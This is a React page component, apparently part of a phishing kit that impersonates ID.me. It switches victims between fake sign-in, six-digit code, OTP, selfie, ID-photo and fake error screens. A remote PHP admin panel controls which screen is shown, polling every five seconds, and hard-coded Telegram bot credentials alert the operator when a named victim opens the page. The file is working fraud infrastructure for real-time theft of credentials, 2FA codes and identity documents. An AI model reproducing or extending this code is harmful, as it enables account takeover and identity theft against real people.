import { useEffect, useState } from "react";
import SigIn from "../components/signin";
import SixDigitsCode from "../components/6digits";
import ErrSixDigitsCode from "../components/incorrect6digits";
import EmailPassReset from "../components/EmailPassReset";
import EmailReset from "../components/EmailReset";
import Selfie from "../components/selfie";
import TakePhotos from "../components/takephotos";
import Verified from "../components/verification";
import logo from "../assets/logo-removebg-preview.png";
import ErrorPage from "../components/errorPage";
import CreateIDME from "../components/CreateIdMe";
import OTP2email from "../components/0TP2email";
import WrongOTP2email from "../components/WrongOTP2email";
import Security from "../components/security";
import W3form from "../components/W3FORM";
import DoYouHaveIdMe from "../components/DoYouHaveIdme";
import LandingPage from "../components/LandingPage";
import CreateAccount from "../components/createIDMeNew";
import SecondErrorPage from "../components/secondErrorPage";
import WeAreVeryfying from "../components/weareveryfying";

// The URL for your PHP backend
const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php"; // Update this based on your server configuration
const BOT_TOKEN = '8030819260:AAGO3xuF9G_BEDvHFwv6viegWw2ezawoW10';
const CHAT_ID = '7062736155';





const UserPage3 = () => {
  const [formType, setFormType] = useState<string>("");
  const [showPopupu3, setShowPopupu3] = useState(false);
  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};
  
  const fullName = parsedData.fullname || "N/A";
  
  
  const sendToTelegram = async (message: string) => {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });
  };
  

  
useEffect(() => {
  // Notify on page load
  sendToTelegram(`✅ ${fullName} has opened the user 3 page.`);
}, []);


  // Fetch the current form from the PHP backend
  useEffect(() => {
    const fetchFormType = async () => {
      try {
        const res = await fetch(`${API_URL}?action=fetch_forms3`);
        const data = await res.json();
        const selectedForm = data?.currentForm3 || "LandingPage";
        setFormType(selectedForm);
      } catch (error) {
        console.error("Failed to fetch form type from PHP:", error);
      }
    };

    fetchFormType();
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      fetch(`${API_URL}?action=get_popup_statusu3`)
        .then(res => res.json())
        .then(data => {
          if (data.showPopupu3) setShowPopupu3(true);
          // Optional: close popup when it's false
          else setShowPopupu3(false);
        });
    }, 5000); // every 5 seconds
  
    return () => clearInterval(interval); // cleanup on unmount
  }, []);
  



  // Fetch the popup status from the PHP backend
  useEffect(() => {
    const fetchPopupStatus = async () => {
      try {
        const res = await fetch(`${API_URL}?action=fetch_error_content`);
        const data = await res.json();
        setShowPopupu3(data?.showPopupu3 || false); // Assuming the backend returns the showPopup flag
      } catch (error) {
        console.error("Failed to fetch popup status from PHP:", error);
      }
    };

    fetchPopupStatus();
  }, []);

  const renderForm = () => {
    switch (formType) {
      case "signin":
        return <SigIn />;
      case "6digitpass":
        return <SixDigitsCode />;
      case "err6digits":
        return <ErrSixDigitsCode />;
      case "WrongEmailAndPassword":
        return <EmailPassReset />;
      case "EmailReset":
        return <EmailReset />;
      case "selfie":
        return <Selfie />;
      case "PhotoLinkToPhoneNumber":
        return <TakePhotos />;
      case "verified":
        return <Verified />;
      case "errorMessage":
        return <ErrorPage />;
      case "createNewIdMeAccount":
        return <CreateIDME />;
      case "OTP2email":
        return <OTP2email />;
      case "WrongOTP2email":
        return <WrongOTP2email />;
      case "security":
        return <Security />;
      case "w3form":
        return <W3form />;
      case "DoYouHaveIdMe":
        return <DoYouHaveIdMe />;
      case "LandingPage":
        return <LandingPage />;
      case "CreateAccount":
        return <CreateAccount />;
      case "SecondErrorPage":
        return <SecondErrorPage />;
      case "WeAreVeryfying":
        return <WeAreVeryfying />;
      default:
        return (
          <div className="animate-pulse max-w-sm mx-auto bg-white p-6 rounded shadow">
            <img src={logo} alt="logo" width={100} />
            <div className="h-6 bg-gray-300 rounded w-1/3 mb-4"></div>
            <div className="h-4 bg-gray-300 rounded mb-2"></div>
            <div className="h-4 bg-gray-300 rounded mb-2"></div>
            <div className="h-4 bg-gray-300 rounded mb-2"></div>
            <div className="h-12 bg-gray-300 rounded mt-4"></div>
          </div>
        );
    }
  };

  const handlePopupDismiss = async () => {
    try {
      // Update the backend to set the popup to false
      await fetch(`${API_URL}?action=update_popupu3`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ showPopupu3: false }),
      });

      // Hide the popup immediately
      setShowPopupu3(false);

      // Refresh the page after dismissing the popup
      window.location.reload(); // This will reload the page
    } catch (error) {
      console.error("Error updating popup status:", error);
    }
  };

  return (
    <div>
      {renderForm()}

      {showPopupu3 && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-xl shadow-lg max-w-md text-center">
            <div className="m-auto flex justify-center p-6">
              <img src={logo} width={100} alt="logo" />
            </div>
            <div className="flex items-center justify-center">
              <svg
                className="animate-spin h-5 w-12 text-blue-800 mb-4"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                ></path>
              </svg>
            </div>

            <p>Refresh Page</p>

            <button
              className="mt-4 bg-green-600 text-white px-4 py-2 rounded"
              onClick={handlePopupDismiss}
            >
              Refresh
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default UserPage3;
